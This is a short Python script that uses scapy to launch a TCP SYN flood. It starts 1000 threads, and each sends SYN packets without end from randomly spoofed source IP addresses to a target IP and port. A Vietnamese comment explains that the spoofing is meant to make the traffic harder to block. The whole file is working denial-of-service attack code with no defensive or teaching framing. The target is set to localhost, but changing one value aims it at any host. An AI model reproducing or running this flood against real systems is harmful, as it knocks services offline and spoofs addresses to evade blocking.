from scapy.all import IP, TCP, send
import random
import threading
target_ip = "127.0.0.1"
target_port = 1000
def syn_flood():
    while True:
        # Giả lập IP nguồn ngẫu nhiên để khó bị chặn
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # Tạo gói tin IP/TCP với cờ SYN (S)
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        send(packet, verbose=False)
        print("cc")

for i in range(1000):
    t=threading.Thread(target=syn_flood)
    t.demon=True
    t.start()

